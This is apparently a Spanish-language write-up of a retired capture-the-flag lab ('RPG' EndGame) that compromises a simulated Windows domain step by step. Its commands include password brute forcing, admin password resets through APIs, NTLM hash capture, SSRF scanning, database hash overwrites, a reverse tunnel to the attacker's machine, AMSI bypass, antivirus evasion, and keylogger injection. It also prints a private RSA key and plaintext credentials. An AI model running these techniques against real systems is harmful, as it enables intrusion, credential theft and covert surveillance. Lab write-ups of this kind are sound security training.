---
title: "EndGame - RPG"
excerpt: "Se realizará un WriteUp del EndGame retirado RPG que cuenta con máquinas Windows. Desarrollaremos cada una paso a paso con el fin de entender y profundizar en nuevos conceptos."
header:
  teaser: "/assets/images/RPG - ENDGAME.gif"
categories:
  - WriteUp
---
<!-- Puedes usar HTML para la imagen y agregar una clase -->
<img src="{{ page.header.teaser }}" alt="Teaser image" class="teaser-img"> 

Comenzamos la exploración de puertos utilizando la herramienta Nmap. En esta instancia específica, identificamos dos hosts: .18 y .19, los cuales serán nuestros puntos de entrada para el laboratorio.

El host .19 presenta el servicio SMB activo. La máquina tiene el nombre "gelus" y está asociada al dominio "roundsoft.local". Sin embargo, carecemos de credenciales válidas, lo que limita nuestra capacidad de aprovechar este recurso.

Por otro lado, en el puerto 80 del host .18 encontramos una interfaz web que muestra únicamente una imagen. Además, en el puerto 3000 se encuentra un servicio de Rocket Chat con un formulario de inicio de sesión. Desafortunadamente, sin credenciales válidas, no podemos acceder a esta plataforma.
```bash
❯ nmap 10.13.38.18-19
Nmap scan report for 10.13.38.18  
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp

Nmap scan report for 10.13.38.19  
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
8081/tcp open  blackice-icecap
```

```bash
❯ crackmapexec smb 10.13.38.19                                            
SMB         10.13.38.19     445    GELUS            [*] Windows 10.0 Build 17763 x64 (name:GELUS) (domain:Roundsoft.local) (signing:False) (SMBv1:False)  
```

En el puerto 80 del host .19, nos encontramos con la página predeterminada de IIS. Sin embargo, en el puerto 8081, somos redirigidos a un panel de inicio de sesión de JFrog Factory.

Tras revisar la documentación, se menciona la existencia de un usuario llamado "access-admin", el cual utiliza autenticación básica. Existe la posibilidad de intentar realizar un ataque de fuerza bruta para obtener la contraseña de este usuario utilizando la API. Sin embargo, al utilizar la contraseña "Password12", recibimos una respuesta 404 en lugar del esperado código 401.

A pesar de disponer de la contraseña, al intentar utilizarla para iniciar sesión, recibimos un mensaje indicando que el acceso a la interfaz ha sido desactivado específicamente para este usuario.

```bash
❯ wfuzz -c -w /usr/share/seclists/Passwords/Leaked-Databases/honeynet.txt -u http://10.13.38.19:8081/access/api/v1 --basic access-admin:FUZZ -H "Content-Type: application/json" --hc 401  
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.13.38.19:8081/access/api/v1
Total requests: 226081

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000966:   404        5 L      17 W       94 Ch       "Password12"
```

Regresando a la documentación, se nos proporciona información sobre cómo cambiar la contraseña de un usuario. En este caso, podemos optar por cambiar la contraseña del usuario "admin" directamente

```bash
❯ curl -s -X PATCH http://10.13.38.19:8081/artifactory/api/access/api/v1/users/admin -u access-admin:Password12 -d '{"password":"password123#"}' -H 'Content-Type: application/json' | jq
{
  "username": "admin",
  "email": "jfrog-admin@roundsoft.local",
  "realm": "internal",
  "status": "enabled",
  "allowed_ips": [
    "*"
  ],
  "created": 
  "modified": 
  "last_login_time": 
  "last_login_ip": 
  "custom_data": {
    "public_key": 
    "apiKey_shash": 
    "apiKey":
    "updatable_profile": "true",
    "private_key":  
    "artifactory_admin": "true"
  },
  "password_expired": false,
  "password_last_modified": 1692981810487,
  "groups": []
}
```

Al acceder como el usuario "admin" con la contraseña previamente definida, hemos ganado acceso a la interfaz de Artifactory. En la página de inicio, se muestra que estamos utilizando la versión 6.13.1 del sistema.

En el apartado de repositorios, encontramos una función llamada "Import Repository from Path". Dado que estamos en un entorno Windows, podemos intentar cargar el directorio de un recurso SMB. Esto nos permitirá establecer una conexión y, potencialmente, obtener un hash de autenticación.

A pesar de que obtenemos un hash NTLMv2, la contraseña parece ser bastante robusta, lo que impide su descifrado mediante un ataque de fuerza bruta para obtenerla en texto plano.

```bash
❯ impacket-smbserver kali . -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.13.38.19,51463)
[*] AUTHENTICATE_MESSAGE (ROUNDSOFT\repository_admin,GELUS)
[*] User GELUS\repository_admin authenticated successfully
[*] repository_admin::ROUNDSOFT:aaaaaaaaaaaaaaaa:b7934db0c9890fdd5989d7f676864a35:010100000000000080ef733174d7d901cbbe46d0826260fe000000000100100041005000520046007700770058004e000300100041005000520046007700770058004e0002001000520043004c0050006900480044004f0004001000520043004c0050006900480044004f000700080080ef733174d7d90106000400020000000800300030000000000000000000000000200000126f6f06f8b269e05bc2e249448f3eaf73a53aa8ae17aa8e117857449cdeea160a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0032000000000000000000  
[*] Closing down connection (10.13.38.19,51463)
[*] Remaining connections []
```

Al revisar los registros de las peticiones en el inicio, identificamos solicitudes provenientes de la dirección IP 192.168.125.135, lo que sugiere la existencia de esta interfaz de red en el entorno. Esta información nos proporciona pistas sobre la topología de la red y nos permite realizar análisis adicionales.

Considerando esta información, podemos emplear una técnica similar a la mencionada anteriormente, pero esta vez utilizando SSRF (Server-Side Request Forgery) para dirigirnos a un recurso interno y escanear el segmento de red. Durante la exploración utilizando el Intruder, notamos que los hosts .88, .128 y .129 muestran tiempos de respuesta considerablemente menores en comparación con otras peticiones realizadas hasta el .256.

Con esta observación, seleccionamos estos tres hosts como nuestro primer payload. Como segundo payload, utilizaremos una lista de palabras que emplearemos para llevar a cabo un ataque de fuerza bruta en busca de posibles recursos SMB existentes en la red.

Además, notamos que la longitud de la petición "development" realizada a la dirección .129 es ligeramente menor en comparación con otras peticiones. Esto nos sugiere la posible existencia de un recurso con este nombre en dicha dirección IP.

Regresando al apartado de "Import Repository", esta vez empleamos un recurso SMB interno, que es \192.168.125.129\Development, con el fin de explorar los archivos que contiene.

Al revisar el repositorio después de esta acción, observamos que se ha agregado una carpeta llamada "feedback", la cual contiene varios archivos, entre ellos, el archivo "flag.txt" que contiene la información que buscamos.

Podemos proceder a descargar el archivo "flag.txt" para acceder a la información que contiene.

```bash
❯ cat flag.txt
RPG{c0waBuN*********tHe_1nt3rn@l!}  
```

Al encontrarnos con el archivo "key.txt" y "Feedbacks.exe", procedemos a ejecutar este último en una máquina Windows. Durante el proceso de ejecución, se nos solicita una clave, lo cual sugiere que dicha clave posiblemente se encuentre en el archivo "key.txt".

En este punto, podemos utilizar el contenido del archivo "key.txt" como la clave requerida para continuar con la ejecución de "Feedbacks.exe".

```bash
❯ cat key.txt
111091166030218062251222010115128136114113076235134212137064020174229081049098149097150097197008100104224193046241175229075026048009246089192212  

❯ file Feedbacks.exe 
Feedbacks.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

```powershell
PS C:\Users\pc1\Desktop> .\Feedbacks.exe  
Key required.
PS C:\Users\pc1\Desktop>
```

Para comprender mejor el funcionamiento interno del archivo "Feedbacks.exe", utilizaremos la herramienta de ingeniería inversa dnSpy para decompilarlo. Dentro del código fuente obtenido, identificamos una función llamada "GetFeedback", la cual recibe un argumento llamado "key" que utiliza como cabecera para autenticarse contra la API ubicada en la dirección IP 192.168.125.135:3000.

Aplicamos un breakpoint en el punto donde se define la cabecera "X-Auth-Token" y ejecutamos el programa, pasándole como argumento el contenido del archivo "key.txt". Al detenerse en el breakpoint, podemos examinar el valor de la variable "key", que será utilizado como contenido para la cabecera de autenticación. Esta cookie nos permitirá autenticarnos exitosamente.

Dado que las solicitudes se dirigen hacia el puerto 3000, podemos suponer que la dirección IP correspondiente es 10.13.38.18, desde otra interfaz. Al autenticarnos con el token obtenido, tendremos acceso a los identificadores de los chats existentes, lo que nos permitirá posteriormente leer su contenido.

```bash
❯ curl -s -H "X-Auth-Token: _bXOx5rjOpTOE3hEfJNTzjAdTWEFas2um7xNH13ylZL" -H "X-User-Id: HTpmn63zyESXXsGZa" -H "Content-Type: application/json" "http://10.13.38.18:3000/api/v1/rooms.get" | jq -r '.update[] ._id'  
2iHYAhwtJjbyj4a6N
DdjTRzK3eskaJ8zkL
GENERAL
HTpmn63zyESXXsGZackBN4uDvbKecTqoBS
HTpmn63zyESXXsGZakRyS6KgwZP4hHiLGz
Saw9bYrjnusg9bheG
X5xn88ZMRjpog4A9h
eoxPkMvnBNCB8q9n8
p3hQTN7DCc885v7cL
qfmwycKpPkHNkLsyg
```

```bash
❯ curl -s -H "X-Auth-Token: _bXOx5rjOpTOE3hEfJNTzjAdTWEFas2um7xNH13ylZL" -H "X-User-Id: HTpmn63zyESXXsGZa" -H "Content-Type: application/json" 'http://10.13.38.18:3000/api/v1/im.messages?roomId=HTpmn63zyESXXsGZackBN4uDvbKecTqoBS' | jq -r '.messages[] .msg'  
No problem
thank you!
Let me know if you have any issues getting in
Ah yes. It should be 'beta_user'
any idea?
but looks like the username was changed
I have the key
so I wanted access to the Nix box
me too
Oh you know, the usual. You?
how are you doing ?
Greetings
hello sir
```

En uno de los chats identificamos una mención al usuario "beta_user" y se hace referencia a que este usuario posee una clave. Este detalle podría ser crucial para acceder a recursos adicionales dentro del sistema.

Por otro lado, en otro chat encontramos un mensaje que menciona una clave adjunta. Se indica que esta clave será necesaria para acceder a la red y se enfatiza la importancia de guardarla en un lugar seguro. Esta clave puede ser vital para acceder a recursos restringidos en la red y su seguridad y resguardo deben ser prioridades.

```bash
❯ curl -s -H "X-Auth-Token: _bXOx5rjOpTOE3hEfJNTzjAdTWEFas2um7xNH13ylZL" -H "X-User-Id: HTpmn63zyESXXsGZa" -H "Content-Type: application/json" 'http://10.13.38.18:3000/api/v1/groups.messages?roomId=X5xn88ZMRjpog4A9h' | jq -r '.messages[] .msg'  
There goes another weekend....
looks like we have a lot of work to do
@here Please keep checking #development_requests

OUT!!!
:anguished:
a...
v...
a...
J..

the next person who talks Java is OUT
look at all the shitty code >_<


please, for god's sake
https://github.com/pH-7/Simple-Java-Calculator
look a calc in Java
༼ つ ◕_◕ ༽つ 
looking it'll be poppin' calc :joy:
MS open sourced calc
https://github.com/microsoft/calculator
funny, look at this
[ ](http://192.168.125.135:3000/group/developers_chat?msg=uJzWdzdN6qRhBi2vL) 
Announcement: The following attached key is necessary for accessing the development network. You each should have the appropriate login name. *Please keep this key safe! *
lulz
you're a skid
I knew it
I must've done something like that...
:cold_sweat:
It sucks when people DoS the boxes
...........................................................................................................................................................................
```

Al revisar el campo "title_link" de los attachments, encontramos algunas rutas, y una de ellas llama particularmente la atención: un archivo denominado "key.txt". Al acceder y leer su contenido, descubrimos que se trata de una clave RSA, lo que sugiere que posiblemente sea utilizada para autenticación SSH.

Este hallazgo puede ser de gran importancia, ya que nos proporciona acceso potencial a recursos adicionales dentro del sistema que podrían estar protegidos mediante SSH. Es crucial mantener esta clave en un lugar seguro y utilizarla con precaución para evitar comprometer la seguridad del sistema.

```bash
❯ curl -s -H "X-Auth-Token: _bXOx5rjOpTOE3hEfJNTzjAdTWEFas2um7xNH13ylZL" -H "X-User-Id: HTpmn63zyESXXsGZa" -H "Content-Type: application/json" 'http://10.13.38.18:3000/api/v1/groups.messages?roomId=X5xn88ZMRjpog4A9h' | jq -r '.messages[] | select(.attachments) | .attachments[] .title_link'  
/file-upload/qAiRe6ijGYYhqmNuK/angry-dwight.gif
/file-upload/DuHLkxGXNFcvWZSDe/Clipboard%20-%20November%2017,%202019%2011:11%20AM
/file-upload/HsfMgTAbbFqDykhJM/SimpleJavaCalculator.java
/file-upload/RNquHSJfdjFiQJbCp/Calculator.java
/file-upload/crBDvzQkhN77KLrxz/key.txt

❯ curl -s -H "X-Auth-Token: _bXOx5rjOpTOE3hEfJNTzjAdTWEFas2um7xNH13ylZL" -H "X-User-Id: HTpmn63zyESXXsGZa" -H "Content-Type: application/json" http://10.13.38.18:3000/file-upload/crBDvzQkhN77KLrxz/key.txt  
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAvucLZy/B0XvfbJWL0PKMyJU7sMsV84GJfUnxQd2dRYo5L6Ka
lZd3l+6++GkiTdLEIHQgSkeqIxQ53B7Ju8WdNfrOBmnkpMDVaFVt0S5nR1DJ/K5E
Jh836bGuXK3gqvAOaIayAj64CbiWPbwHUJ2ZWXWJNH8sUY7F1lqMYoXDfCtmLYd2
8zZyqSEXBs8ONDwsVTnzDyMfIHU96d3LzyA0D/Gqn2NTb142yGHhnRbXFnfxkMcf
+VKKXYF71N3Wo1bIVGMk7L3OHdRXbjgX/VQ7GkN0ZNHgAI2vNinzQRFnZxIpaIgV
wAQ8ygt9PocHaiYK7rNmpZU7hzOSeAC3t+HEQwIDAQABAoIBAQCx/hhauGN9X4L8
6h53zn7HUqVZ/LDV3vSDldrVL71AplUVfgWl7pj6VwdF9Dig2SA2pi+pMlKG7Ifa
Hfa4FdO0Dcnknv0pRAZ2hhijTiHLk58Q8qbl6HuocBuDnDd7CeJVQSleAH51yd6D
ZvpnBtqBV557DQwUaws5BioYfmG7NdlgZR4ZWH6eb6zhAByq9mX1wcT5IeNH4mXZ
inLPev2op98kswLLs56RHoSH7TIDX8QDoXho+4RQ78jvzYYhlGVDyAtEcEo6h7+M
rdfVAV+061pBBandzCtedAO75Ahsa5qBhpb9yvAIvcg0hjNXeVlZuX/x9CF8qZCJ
us1FfcYxAoGBAPTypqYHekZXnY6YzWQ2dSVbUzFYEmlqeEwvDGGbhwPsRlWvY3SG
u17lT+OHWpYS4EF6CPkStR3SJrnSbjfm/gKurayLyKwB3s/VS0Ah1wh54pDsbXu9
zcu1TiADxWEjBeBHsSoFIzPmEtwf0hu/Qe47QXdsBiU+sx7G6KcAjhb5AoGBAMeE
ICFNkwpop8mh5da0pSSP1R/Ke/a2S5UcziMeUhmQRHv+cKmvuEnNBUIEFPilcDvN
mr8Ja/P4+P3yRV1szoTVuCfO6cBxsX3gO7Ea5GlnMQBxgDGWMR8/UhGwTMxYDHDj
76yp6FrCUmPNDj/3TglGHcGLcl/eXmLcfM5mLhgbAoGBAJ9fdiCWwu8buK78Kr8m
U6g/uGxlom0mUik3f3XOrNVXmRfNKwe5VhZTW1xuR/lXRMQ1c7sjeeZyQrIrAX2r
9N+n6eZXePS5rtBJNlH+8ptYOpsSydV2VH1TdQaNjZI7KGqaGuJ9Pz9YVjMVHS7i
jTJFKb5a8dCv7/l5cAyg5tJ5AoGAcnd7d5/qHK6ulSAtnWFG3hMnU3X4aTNtab99
BOkAcWoz4G+6c6A9OxpFSfrNjVpdafIsNi5RoUfWktvMsC0cz1lOrogn1CFmk7Fy
jcnAAjkSBA8aXViuFh9eFofvh818VchwWb+hb3DNlDSxWEGqo+d2avR2SkpqHI4j
jMdS6sECgYEAg9AhMsjpYZs5TAm3z8OaRoQMOndX0DGrqsOVtOc38vxWihiUsaVq
aXM9ciStPc4OnIReQyet5u1BSrKux4DCjtpf7JxNrFdSB6lbyVIu/jWrTXiP9dfD
XlWHR1siUlJmdvbPtgp9+YQ4pDUWkbG9uOPXWgkvGnXGfqugbIvVgPo=
-----END RSA PRIVATE KEY-----
```

Excelente, al conectarnos a SSH como el usuario "beta_user" proporcionando la clave RSA que obtuvimos previamente, logramos establecer una conexión exitosa. Ahora tenemos acceso a una shell en el sistema, lo que nos brinda la oportunidad de explorar y realizar operaciones dentro del entorno del usuario "beta_user".

Este acceso puede ser invaluable para llevar a cabo diversas acciones, como la exploración de archivos y directorios, la ejecución de comandos en el sistema, y la investigación de posibles vulnerabilidades o brechas de seguridad adicionales. Es fundamental usar este acceso con responsabilidad y cautela, manteniendo siempre la integridad y la seguridad del sistema como prioridad.

```bash
❯ ssh beta_user@10.13.38.18 -i id_rsa
beta_user@Ignis:~$ id
uid=1002(beta_user) gid=1002(beta_user) groups=1002(beta_user)
beta_user@Ignis:~$ hostname -I
10.13.38.18 192.168.125.135 172.17.0.1 dead:beef::250:56ff:fe07:4590  
beta_user@Ignis:~$
```

Dentro de la máquina, tenemos acceso a la base de datos de MongoDB que se utiliza para gestionar la web de Rocket Chat. Al explorar las bases de datos disponibles, identificamos tres, de las cuales utilizaremos "parties".

Según la documentación de Rocket Chat, encontramos un procedimiento para cambiar la contraseña de un usuario directamente a través de MongoDB. En este caso, procederemos a cambiar la contraseña del usuario "dev-admin".

Para llevar a cabo este cambio, realizaremos las operaciones pertinentes en la base de datos "parties" utilizando las consultas adecuadas para actualizar la información del usuario "dev-admin" con la nueva contraseña deseada. Es importante seguir los procedimientos cuidadosamente para garantizar que el cambio se realice de manera segura y efectiva.

```bash
beta_user@Ignis:/snap/rocketchat-server/1427/bin$ ./mongo
MongoDB shell version v3.6.14
connecting to: mongodb://127.0.0.1:27017/?gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("87397f7a-ad2b-42b1-8aa0-77784876b82a") }
MongoDB server version: 3.6.14
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
	http://docs.mongodb.org/
Questions? Try the support group
	http://groups.google.com/group/mongodb-user
Server has startup warnings: 
2023-08-25T00:06:02.664+0000 I STORAGE  [initandlisten] 
2023-08-25T00:06:02.664+0000 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine  
2023-08-25T00:06:02.664+0000 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem
2023-08-25T00:06:07.539+0000 I CONTROL  [initandlisten] 
2023-08-25T00:06:07.539+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
2023-08-25T00:06:07.539+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
2023-08-25T00:06:07.539+0000 I CONTROL  [initandlisten] ** WARNING: You are running this process as the root user, which is not recommended.
2023-08-25T00:06:07.539+0000 I CONTROL  [initandlisten] 
rs0:PRIMARY> show dbs  
admin    0.000GB
config   0.000GB
local    0.031GB
parties  0.010GB
rs0:PRIMARY> use parties
switched to db parties
rs0:PRIMARY>
```

Una vez hemos cambiado la contraseña del usuario "dev-admin" a través de MongoDB siguiendo los procedimientos de la documentación de Rocket Chat, ahora podemos acceder a la interfaz utilizando las credenciales actualizadas. Esto implica que podemos iniciar sesión como "dev-admin" utilizando la contraseña "12345".

Al tener acceso a la interfaz como "dev-admin", podemos aprovechar los privilegios y funcionalidades asociadas a este usuario para llevar a cabo diversas tareas de administración y configuración dentro de Rocket Chat. Es importante utilizar este acceso con responsabilidad y seguir las mejores prácticas de seguridad para proteger la integridad del sistema.

```powershell
rs0:PRIMARY> db.users.update({"username": "dev-admin"}, {$set:{"services.password.bcrypt":"$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG"}})  
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
rs0:PRIMARY>
```

En el canal "onboarding_information", el usuario "roundsoft_hr" proporciona información sobre el sitio y muestra una contraseña por defecto, la cual podría ser potencialmente útil para nuestros propósitos.

Además, más abajo en el canal, encontramos un hilo creado por "janderson" debido a que su contraseña no funciona. La respuesta a su consulta indica que la contraseña ha sido cambiada y se proporciona la nueva.

Teniendo en cuenta esta información, sabemos que existen varios equipos en los cuales podríamos intentar autenticarnos. Después de realizar un escaneo con Nmap de los hosts que conocemos, identificamos que la dirección .128 corresponde a un controlador de dominio (DC), mientras que las direcciones .88 y .129 están asociadas al dominio.

Con esta información, podemos dirigir nuestros esfuerzos de autenticación hacia los equipos pertinentes, aprovechando las contraseñas proporcionadas y la estructura de dominio identificada para avanzar en nuestra investigación y objetivos.

```bash
beta_user@Ignis:~$ ./nmap -T5 -Pn -n 192.168.125.88  
Nmap scan report for 192.168.125.88
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  loc-srv
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  unknown
8040/tcp  open  unknown
8045/tcp  open  unknown
8081/tcp  open  tproxy
beta_user@Ignis:~$ ./nmap -T5 -Pn -n 192.168.125.128  
Nmap scan report for 192.168.125.128
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos
135/tcp   open  loc-srv
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd
593/tcp   open  unknown
636/tcp   open  ldaps
3268/tcp  open  unknown
3269/tcp  open  unknown
5985/tcp  open  unknown
9389/tcp  open  unknown
beta_user@Ignis:~$ ./nmap -T5 -Pn -n 192.168.125.129  
Nmap scan report for 192.168.125.129
PORT      STATE SERVICE
135/tcp   open  loc-srv
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  unknown
5985/tcp  open  unknown
```

Para establecer una conexión desde nuestro equipo, podemos utilizar Ligolo-ng. Usaremos el agente para conectarnos a nuestro equipo a través del puerto 11601, que está marcado como el proxy.

Utilizando Ligolo-ng, podemos configurar el agente para que establezca una conexión desde la máquina objetivo hacia nuestro equipo a través del puerto 11601. Esto nos permitirá establecer una conexión segura y cifrada entre los dos equipos, facilitando así la transferencia de datos y la ejecución de comandos de manera remota.

```powershell
beta_user@Ignis:~$ ./agent -connect 10.10.14.10:11601 -ignore-cert &
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                 addr="10.10.14.10:11601"  
```

Una vez hemos obtenido una sesión en el proxy, la identificamos y luego iniciamos el túnel utilizando el comando `start`. Este comando establecerá la conexión entre el proxy y nuestro equipo a través del puerto 11601, permitiéndonos así canalizar el tráfico de manera segura entre ambos dispositivos.

```bash
❯ ./proxy -selfcert
WARN[0000] Using automatically generated self-signed certificates (Not recommended)  
INFO[0000] Listening on 0.0.0.0:11601
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

Made in France ♥ by @Nicocha30!

ligolo-ng » 
INFO[0011] Agent joined.    name=beta_user@Ignis remote="10.13.38.18:43462"
ligolo-ng » session
? Specify a session : 1 - beta_user@Ignis - 10.13.38.18:43462
[Agent : beta_user@Ignis] » start
INFO[0014] Starting tunnel to beta_user@Ignis           
[Agent : beta_user@Ignis] »
```

Excelente, luego de agregar el segmento 192.168.125.0/24 a la interfaz de Ligolo, hemos establecido conexión con todos los equipos dentro del dominio. Podemos verificar la conectividad utilizando el comando `ping`.

Una vez que hemos configurado Ligolo con éxito, hemos logrado establecer conexión con los tres equipos Windows. Ahora, utilizando la herramienta CrackMapExec, podemos enumerar los nombres de equipos dentro del dominio, lo que nos proporciona una visión más detallada de la infraestructura de la red y nos permite planificar nuestros próximos pasos con mayor precisión.

```bash
❯ sudo ip route add 192.168.125.0/24 dev ligolo

❯ ping -c1 -w1 192.168.125.128
PING 192.168.125.128 (192.168.125.128) 56(84) bytes of data.
64 bytes from 192.168.125.128: icmp_seq=1 ttl=64 time=164 ms  

--- 192.168.125.128 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 163.769/163.769/163.769/0.000 ms
```

```bash
❯ crackmapexec smb 192.168.125.88-129
SMB         192.168.125.88  445    GELUS            [*] Windows 10.0 Build 17763 x64 (name:GELUS) (domain:Roundsoft.local) (signing:False) (SMBv1:False)
SMB         192.168.125.128 445    SHINRA           [*] Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
SMB         192.168.125.129 445    LUX              [*] Windows 10.0 Build 18362 x64 (name:LUX) (domain:Roundsoft.local) (signing:False) (SMBv1:False)
```

Para mayor comodidad y para facilitar futuros ataques, agregaremos las direcciones IP junto con sus respectivos nombres de host y dominios al archivo `/etc/hosts`. Utilizaremos el nombre de host como el nombre de la máquina y el dominio "roundsoft.local".

Una vez que hayamos configurado el archivo `/etc/hosts`, podemos proceder a verificar la contraseña que recibió el usuario "janderson" a través del chat contra SHINRA, que es el Controlador de Dominio (DC). Dado que las credenciales son válidas a nivel de dominio, podemos utilizarlas para autenticarnos en el Controlador de Dominio y llevar a cabo acciones adicionales dentro del dominio "roundsoft.local".

```bash
❯ crackmapexec smb shinra.roundsoft.local -u janderson -p Welcome_roundsoft2019!
SMB         roundsoft.local 445    SHINRA           [*] Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
SMB         roundsoft.local 445    SHINRA           [+] Roundsoft.local\janderson:Welcome_roundsoft2019!
```

Es importante destacar que, al intentar probar las credenciales para el protocolo WinRM en todos los equipos del dominio, deberíamos esperar que la mayoría de los equipos devuelvan un error en caso de que las credenciales no sean válidas. Sin embargo, si las credenciales son válidas, deberíamos poder establecer una conexión exitosa.

En este caso, es notable que el host .129 devuelve un mensaje "Pwn3d!". Esto sugiere que las credenciales proporcionadas son válidas para este equipo en particular y que hemos logrado comprometerlo de alguna manera. Es esencial proceder con precaución y ética al investigar más a fondo este acceso y evitar cualquier actividad que pueda dañar la integridad o la seguridad del sistema.

```zsh
❯ crackmapexec winrm 192.168.125.88-129 -u janderson -p Welcome_roundsoft2019!
SMB         192.168.125.88  5985   GELUS            [*] Windows 10.0 Build 17763 (name:GELUS) (domain:Roundsoft.local)
SMB         192.168.125.128 5985   SHINRA           [*] Windows 10.0 Build 14393 (name:SHINRA) (domain:Roundsoft.local)  
SMB         192.168.125.129 5985   LUX              [*] Windows 10.0 Build 18362 (name:LUX) (domain:Roundsoft.local)
HTTP        192.168.125.88  5985   GELUS            [*] http://192.168.125.88:5985/wsman
HTTP        192.168.125.128 5985   SHINRA           [*] http://192.168.125.128:5985/wsman
HTTP        192.168.125.129 5985   LUX              [*] http://192.168.125.129:5985/wsman
HTTP        192.168.125.88  5985   GELUS            [-] Roundsoft.local\janderson:Welcome_roundsoft2019! 
HTTP        192.168.125.128 5985   SHINRA           [-] Roundsoft.local\janderson:Welcome_roundsoft2019! 
HTTP        192.168.125.129 5985   LUX              [+] Roundsoft.local\janderson:Welcome_roundsoft2019! (Pwn3d!)
```

```powershell
❯ evil-winrm -i lux.roundsoft.local -u janderson -p Welcome_roundsoft2019!  
PS C:\Users\janderson\Documents> whoami
roundsoft\janderson
PS C:\Users\janderson\Documents>
```


Es una estrategia inteligente usar la versión ofuscada de WinPEAS para evitar la detección del antivirus y garantizar que se ejecute sin problemas. Esto nos permitirá obtener un análisis completo del sistema sin ser bloqueados por el software de seguridad.

Es crucial estar atentos a cualquier hallazgo que pueda resultar relevante durante el análisis. Las sesiones de RDP y Putty que aparecen en los resultados de WinPEAS son particularmente llamativas y pueden indicar la presencia de actividades significativas en el sistema.

Es recomendable investigar más a fondo estas sesiones para determinar su origen y su propósito. Podrían contener información importante sobre actividades de usuarios, conexiones remotas o posibles puntos de entrada para realizar movimientos posteriores en el sistema.

```powershell
╔══════════╣ RDP Sessions
    SessID    pSessionName   pUserName      pDomainName              State     SourceIP  
    1                        janderson      ROUNDSOFT                Disconnected

╔══════════╣ Putty SSH Host keys
    ssh-ed25519@22:192.168.125.135:  
```

Antes de poder ejecutar cualquier script en el sistema, necesitaremos habilitar la ejecución de scripts, ya que parece que está deshabilitada actualmente. Para ello, podemos utilizar el siguiente comando en PowerShell:

```powershell
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
```

Este comando establecerá la política de ejecución de scripts como "RemoteSigned" para el usuario actual, lo que permitirá la ejecución de scripts descargados de Internet pero requerirá la firma digital para scripts locales.

Después de habilitar la ejecución de scripts, podremos importar y utilizar Invoke-PSInject para migrar a un proceso de la sesión y ejecutar nuestro keylogger.

```powershell
PS C:\Users\janderson\Documents> Bypass-4MSI

Info: Patching 4MSI, please be patient...

[+] Success!

PS C:\Users\janderson\Documents> upload Keylogger_x64.exe

Info: Uploading Keylogger_x64.exe to C:\Users\janderson\Documents\Keylogger_x64.exe  

Data: 48468 bytes of 48468 bytes copied

Info: Upload successful!

PS C:\Users\janderson\Documents> upload Invoke-PSInject.ps1

Info: Uploading Invoke-PSInject.ps1 to C:\Users\janderson\Documents\Invoke-PSInject.ps1

Data: 682728 bytes of 682728 bytes copied

Info: Upload successful!

PS C:\Users\janderson\Documents> Import-Module .\Invoke-PSInject.ps1
File C:\Users\janderson\Documents\Invoke-PSInject.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.  
At line:1 char:1
+ Import-Module .\Invoke-PSInject.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : SecurityError: (:) [Import-Module], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
```

El parámetro `-s` en Evil-WinRM nos permite especificar la ruta para los scripts que queremos ejecutar en el sistema remoto. Esto nos permite sortear las restricciones de ejecución de scripts que puedan estar en su lugar, ya que estamos ejecutando los scripts directamente desde el contexto de Evil-WinRM en lugar de cargarlos localmente en el sistema remoto.

Una vez que hayamos especificado la ruta para los scripts, podemos llamar a los scripts necesarios, incluido Invoke-PSInject, para migrar a un proceso de sesión y ejecutar nuestro keylogger de manera exitosa. Esto nos permitirá sortear la restricción de ejecución de scripts y llevar a cabo nuestras acciones planificadas en el sistema remoto.

```powershell
❯ evil-winrm -i lux.roundsoft.local -u janderson -p Welcome_roundsoft2019! -s .  
PS C:\Users\janderson\Documents> Invoke-PSInject.ps1
PS C:\Users\janderson\Documents>
```

